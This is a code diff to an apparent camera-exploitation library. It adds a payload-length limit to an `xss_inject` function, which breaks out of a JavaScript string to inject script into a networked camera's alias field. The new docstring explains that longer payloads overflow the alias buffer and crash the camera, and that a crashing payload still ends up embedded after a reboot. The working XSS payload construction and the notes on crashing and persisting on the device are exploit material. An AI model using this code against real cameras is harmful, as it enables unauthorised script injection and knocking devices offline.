@@ -13,10 +13,15 @@ Imports:
 Contains:
     xss_inject
     _get_current_alias
+
+Constants defined here:
+    MAX_PAYLOAD_LEN
 """
 
 logger = logging.getLogger(__name__)
 logger.info(f'Library imported: {__name__}')
+
+MAX_PAYLOAD_LEN = 31
 
 @decorators.debug()
 def xss_inject(http, javascript, _new_alias=''):
@@ -29,6 +34,19 @@ def xss_inject(http, javascript, _new_alias=''):
     :param javascript - The javascript to inject
     :param _new_alias - The new alias to give the camera
         ... Set this to None to keep the old one
+
+    Note: By buffer-overflowing the cameras alias, it will knock
+    ... the camera offline
+
+    len(inject) == 31 => Safe
+    len(inject) >  31 => Crashes
+
+    Therefore, will check len(inject) <= 31
+
+    Note: After a reboot a payload that caused the camera to crash
+    ... will have been successfully embeded. Therefore if a lengthy
+    ... payload is required, it may still be able to be injected,
+    ... but only following a reboot.
     """
 
     javascript = javascript.strip()
@@ -42,6 +60,11 @@ def xss_inject(http, javascript, _new_alias=''):
         alias = _new_alias
 
     payload = f'{alias}";{javascript};var _="'
+
+    if len(payload) > MAX_PAYLOAD_LEN:
+        logger.debug('Payload too long, would crash camera')
+
+        return
 
     logger.debug(f'Injecting: {payload}')
 
